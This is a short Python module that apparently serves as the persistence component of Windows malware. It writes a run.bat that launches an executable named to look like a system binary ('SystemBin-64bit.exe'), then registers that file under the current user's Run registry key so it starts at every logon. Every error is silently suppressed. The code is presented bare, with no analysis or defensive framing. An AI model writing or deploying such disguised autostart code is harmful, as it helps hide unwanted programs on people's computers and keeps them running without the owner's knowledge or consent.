import subprocess
import os


class StartUp:
    def run(self):
        try:
            self.dir = os.getcwd()
            if not os.path.isfile("run.bat"):
                with open(f"{self.dir}/run.bat", "w") as f:
                    f.write("@echo off")
                    f.write(f'\nstart "" "{self.dir}\SystemBin-64bit.exe"')
                self.reg_edit()
            else:
                return
        except:
            return
            
    def reg_edit(self):
        try:
            subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SystemBit-64bit", "/f"], shell=True)
            subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "SystemBit-64bit", "/t", "REG_SZ", "/d", f"{self.dir}\\run.bat", "/f"], shell=True)
        except:
            return
    
        
#startup = StartUp()
#startup.run()
